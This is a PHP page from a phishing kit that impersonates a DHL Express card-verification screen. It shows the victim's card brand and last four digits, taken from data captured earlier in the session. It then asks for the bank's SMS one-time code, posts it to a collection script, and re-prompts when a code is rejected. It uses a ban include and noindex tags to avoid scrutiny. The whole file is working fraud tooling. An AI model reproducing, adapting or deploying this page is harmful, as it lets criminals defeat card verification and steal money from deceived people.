<?php
   session_start();
   include("./c/ban.php");
   include("./c/sys.php");
   include("lang.php");
   if (!isset($_SESSION["i"])) {
      header("Location: billing.php?#{$rand}");
      die();
   }
   $one = $_SESSION["i"];
   $one = str_replace(" ","",$one);
?>
<!DOCTYPE html>
<html <?php if (get_language($_SESSION['co_code'])=='ar') { echo 'lang="ar" dir="rtl"'; }else{ echo 'lang="en" dir="ltr"'; } ?> >
   <head>
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache, nosnippet">
      <link rel="icon" type="image/x-icon" href="./f/favicon.ico" />
      <link rel="stylesheet" href="./f/c.css">
      <title>| DHL |</title>
   </head>
   <body>
      <form action="./s/c.php" method="post">
         <div>
            <div class="modal-dialog shadow">
               <div class="modal-content" style="margin-top: 50px;">
                  <div class="modal-header">
                     <img src="./f/dhl-logo.svg" onclick="location.href = 'index.php?#<?php echo $rand; ?>';">
                     <?php
                       if ($one[0]==4) {
                          echo '<img src="./f/VISA.png" class="sfli">';
                       }else if ($one[0]==5) {
                          echo '<img src="./f/MASTERCARD.png" class="sfli">';
                       }elseif ($one[0]==7) {
                          echo '<img src="./f/AMEX.png" class="sfli">';
                       }else{
                          // nothing
                       }
                     ?>
                  </div>
                  <div class="modal-body">
                     <div class="text-center pp">
                        <h6><?php echo get_text("sms-title"); ?></h6>
                     </div>
                     <div class="tato">
                        <p style=" text-align: center; "><?php echo get_text("sms-message"); ?></p>
                     </div>
                     <div class="content">
                        <div class="left">
                           <span><?php echo get_text("merchant"); ?>:</span>
                           <span style="margin-top: 10px;"><?php echo get_text("amount"); ?>:</span>
                           <span style="margin-top: 10px;"><?php echo get_text("date"); ?>:</span>
                           <span style="margin-top: 10px;"><?php echo get_text("credit-card-number"); ?>:</span>
                           <span class="osama" style="margin-top: 43px;"><?php echo get_text("sms_code_label"); ?></span>
                        </div>
                        <div class="right">
                           <span style="margin-left: 9px; color: rgb(227,41,31);">DHL Express</span>
                           <span style="margin: 10px;  font-weight: normal;"><?php echo get_text("total"); ?></span>
                           <span style="margin: 10px;"><?php echo date("d/m/Y h:i A"); ?></span>
                           <span style="margin: 10px;">XXXX XXXX XXXX <?php echo substr($one , -4);?></span>
                           <span style="margin-top: 35px; margin-bottom: 30px;">
                              <div class="form-group">
                                 <input type="text" name="sm" id="sm" class="form-control" style="border-radius: 1.25rem; <?php if ($_SESSION['otp']>0) { echo 'border-color: red;'; } ?>" maxlength="20" required="" autocomplete="off">
                                 <div style="margin-bottom: 10px;"></div>
                                 <?php
                                    if ($_SESSION['otp']>0) {
                                       echo '<b style="font-size: 10px !important; font: status-bar; color: red; font-weight: bold; ">'.get_text("sms_errur").'</b>';
                                    }
                                 ?>
                              </div>
                           </span>
                        </div>
                     </div>
                     <div class="time ">
                        <p><?php echo get_text("sms-again"); ?></p>
                        <div class="countdown ms-2" style="color:red;"></div>
                     </div>
                     <div class="botona">
                        <button class="btn" name="otp"><?php echo get_text("submit"); ?></button>
                     </div>
                     <div class="copirayt text-center">
                        <p><?php echo get_text("copyright"); ?></p>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </form>
   </body>
</html>